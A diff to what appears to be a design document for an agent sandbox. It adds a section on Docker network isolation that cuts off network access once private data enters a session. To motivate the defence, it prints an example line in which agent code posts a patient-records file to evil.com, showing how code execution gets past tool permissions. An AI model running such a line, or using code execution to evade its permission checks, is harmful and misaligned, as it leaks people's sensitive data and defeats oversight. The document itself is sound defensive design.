@@ -221,6 +221,70 @@ STARTING → RUNNING → STOPPED (graceful)
 - Maintains network isolation in restricted environments
 - Optional feature activated via configuration
 
+### Network Isolation with PrivateData
+
+The tool permission system (the `@tool_permission` decorator with `CONNECT` permission) prevents data exfiltration through PydanticAI tools, but it cannot reach code that runs inside a Docker container. When the agent uses the CodeAct pattern to execute arbitrary Python, it can bypass tool permissions entirely:
+
+```python
+# This runs inside the container, outside the tool permission system
+import requests
+requests.post("https://evil.com", data=open("/workspace/patient_records.csv").read())
+```
+
+The solution is infrastructure-level network isolation that the container cannot circumvent. Docker's `network_mode="none"` removes all network interfaces except loopback -- no sockets, no DNS, no tunneling. The sandbox ties this to the `PrivateData` compliance system so that network access is revoked automatically when sensitive data enters the session.
+
+**NetworkMode Selection**:
+
+A `NetworkMode` enum maps directly to Docker network configuration:
+
+```python
+class NetworkMode(str, Enum):
+    FULL = "bridge"   # default Docker bridge networking
+    NONE = "none"     # loopback only, no external access
+
+def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
+    if session_has_private_data(user_id, session_id):
+        return NetworkMode.NONE
+    return NetworkMode.FULL
+```
+
+The check is deliberately simple: if the session has private data, the container gets no network. There is no allow-list, no proxy, no partial access. The binary choice eliminates configuration errors and makes the security property easy to audit.
+
+**Mid-Conversation Ratchet**:
+
+A session may start without private data and acquire it later when a connector retrieves sensitive records. The `SandboxManager` checks `PrivateData` state on every `get_or_create_session()` call. If the session's current network mode no longer matches what `PrivateData` requires, the manager stops the existing container and creates a new one with network disabled:
+
+```python
+def _ensure_network_mode(self, session: Session) -> None:
+    required = get_network_mode(session.user_id, session.session_id)
+    if session.network_mode == required:
+        return
+    if required == NetworkMode.NONE:
+        self._recreate_container(session)
+```
+
+This transition is a one-way ratchet: `FULL` to `NONE`, never the reverse. Once private data has entered the session, the network stays off for the remainder of the session's lifetime, mirroring the ratchet behavior in `PrivateData` itself where sensitivity escalates but never degrades.
+
+**Workspace Survival**:
+
+Container recreation does not lose data. Each session's workspace lives on the host filesystem and is bind-mounted into the container at `/workspace`. When the old container is removed and a new one is created, the same host directory is mounted again. From the agent's perspective, all files are still present -- only the network has changed.
+
+```python
+volumes={str(session.data_dir): {"bind": "/workspace", "mode": "rw"}}
+```
+
+This design means the container is a disposable execution environment: its lifecycle is independent from the data it operates on. The sandbox can recreate containers for network isolation, failure recovery, or configuration changes, and the workspace persists through all of these events.
+
+**Integration with the Compliance Pipeline**:
+
+The full data protection pipeline works across three layers:
+
+1. **Connectors** tag the session via `PrivateData.add_private_dataset()` when sensitive data enters
+2. **Tool permissions** block `CONNECT` tools through the `@tool_permission` decorator
+3. **Container network** blocks raw network access through `network_mode="none"`
+
+Layers 2 and 3 are independent enforcement points. Tool permissions prevent exfiltration through the agent's normal tool-calling path. Container network isolation prevents exfiltration through arbitrary code execution inside the sandbox. Together, they close both vectors without relying on the agent's cooperation.
+
 ### Observability Design
 
 Comprehensive structured logging enables debugging, auditing, and operational monitoring.
